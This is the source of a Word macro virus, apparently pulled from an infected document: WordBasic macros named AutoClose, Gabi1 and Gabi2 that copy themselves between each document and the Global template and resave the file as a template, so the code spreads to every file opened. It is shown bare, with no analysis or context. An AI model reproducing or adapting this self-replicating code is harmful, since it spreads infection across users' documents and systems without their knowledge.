   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim b$
       b$ = WordBasic.[FileName$]()
       'MsgBox b$
       WordBasic.FileSaveAs Name:=b$, Format:=1
       WordBasic.MacroCopy b$ + ":Gabi1", "Global:Gabi1", 0
       WordBasic.MacroCopy b$ + ":Gabi2", "Global:Gabi2", 0
       WordBasic.MacroCopy b$ + ":Gabi2", "Global:AutoClose", 0
   End Sub

   Attribute VB_Name = "Gabi2"

   Public Sub MAIN()
   Dim b$
       b$ = WordBasic.[FileName$]()
       'MsgBox b$
       WordBasic.FileSaveAs Name:=b$, Format:=1
       WordBasic.MacroCopy "Global:Gabi1", b$ + ":Gabi1", 0
       WordBasic.MacroCopy "Global:Gabi2", b$ + ":Gabi2", 0
       WordBasic.MacroCopy "Global:Gabi1", b$ + ":AutoClose", 0
   End Sub

   Attribute VB_Name = "Gabi1"

   Public Sub MAIN()
   Dim b$
       b$ = WordBasic.[FileName$]()
       'MsgBox b$
       WordBasic.FileSaveAs Name:=b$, Format:=1
       WordBasic.MacroCopy b$ + ":Gabi1", "Global:Gabi1", 0
       WordBasic.MacroCopy b$ + ":Gabi2", "Global:Gabi2", 0
       WordBasic.MacroCopy b$ + ":Gabi2", "Global:AutoClose", 0
   End Sub
